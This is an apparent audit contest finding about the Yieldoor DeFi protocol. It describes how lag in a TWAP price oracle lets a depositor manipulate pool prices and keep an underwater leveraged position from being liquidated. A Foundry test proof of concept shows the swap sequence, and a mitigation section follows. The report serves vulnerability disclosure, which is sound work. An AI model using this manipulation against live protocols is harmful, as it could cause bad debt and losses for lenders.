# Attacker Will Exploit TWAP Lag to Prevent Liquidation of Underwater Positions

### Summary

The missing immediate update of the TWAP after a significant price change will cause a temporary inability to liquidate underwater positions for the protocol as an attacker can manipulate the pool price to delay the TWAP update, creating a window where positions that should be liquidated remain open.

### Root Cause
https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Strategy.sol#L357-L361
The current TWAP is not updated immediately after a drastic price change, allowing for manipulation of the pool price to delay the TWAP update.

### Internal Pre-conditions

The owner needs to set up the environment with the initial oracle prices and deploy the necessary contracts.
The depositor needs to create a leveraged position with specific parameters.
The owner needs to simulate a flash crash by drastically changing the oracle price.

### External Pre-conditions

1. The price of BTC needs to drop significantly (e.g., 50% or 75%) within a short time frame.
2. The TWAP mechanism must rely on historical prices and not update immediately with the latest price changes.

### Attack Path

The owner sets up the environment and deploys the necessary contracts.
The depositor creates a leveraged position.
The owner simulates a flash crash by changing the oracle price drastically.
The depositor manipulates the pool price to delay the TWAP update.
The owner checks if the position is liquidatable immediately after the price crash and after pool manipulation.
6. If the position is not liquidatable, the owner further manipulates the price and checks again.
The owner fast-forwards time to allow the TWAP to catch up and checks the liquidatable status again.

### Impact

The protocol suffers from a temporary inability to liquidate underwater positions, potentially leading to bad debt. The attacker can exit positions that should be liquidated, causing financial loss to the protocol.

### PoC

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../lib/forge-std/src/Test.sol";
import {MockOracle} from "./utils/MockOracle.sol";
import {ILeverager} from "../src/interfaces/ILeverager.sol";

contract TwapLiquidationVulnerabilityTest is BaseTest {
    function test_twapOracleLagVulnerability() public {
        // Setup and initial price checks
        vm.startPrank(owner);
        MockOracle(wbtcOracle).setPrice(30000e18);
        vm.stopPrank();

        // Create leveraged position
        vm.startPrank(depositor);
        ILeverager.LeverageParams memory lp;
        lp.amount0In = 0.5e8;
        lp.amount1In = 50_000e6;
        lp.vault = vault;
        lp.maxBorrowAmount = 0.6e8;
        lp.denomination = address(wbtc);
        uint256 posId = ILeverager(leverager).openLeveragedPosition(lp);
        vm.stopPrank();

        // Simulate flash crash
        vm.startPrank(owner);
        MockOracle(wbtcOracle).setPrice(15000e18);
        vm.stopPrank();

        // Manipulate pool price
        vm.startPrank(depositor);
        swapWbtc(5e7);
        swapUsdc(1000000e6);
        swapWbtc(3e7);
        vm.stopPrank();

        // Check liquidatable status
        vm.startPrank(owner);
        bool isLiquidatable = ILeverager(leverager).isLiquidateable(posId);
        console.log("Is liquidatable after manipulation:", isLiquidatable);
        vm.stopPrank();
    }
}
```

### Mitigation

Ensure that the TWAP is updated more frequently or immediately after significant price changes. Additionally, consider implementing safeguards to prevent manipulation of the pool price that could delay the TWAP update.
